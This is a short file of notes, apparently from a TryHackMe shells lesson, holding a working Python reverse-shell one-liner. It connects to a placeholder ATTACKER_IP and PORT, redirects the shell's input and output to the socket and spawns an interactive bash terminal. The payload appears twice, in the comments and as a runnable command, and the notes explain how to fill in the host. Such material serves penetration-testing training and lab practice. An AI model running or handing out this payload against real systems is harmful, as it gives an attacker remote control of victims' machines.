# Python Reverse Shell - Short One-liner
# Source: TryHackMe - Shells Overview, Task 6
# Usage: replace ATTACKER_IP and PORT, then run with: python3 -c '<command>'
#        (use python -c for Python 2)
#
#   python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
#
# Minimal version: creates socket, connects to attacker,
# redirects stdin/stdout/stderr, spawns bash PTY.

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
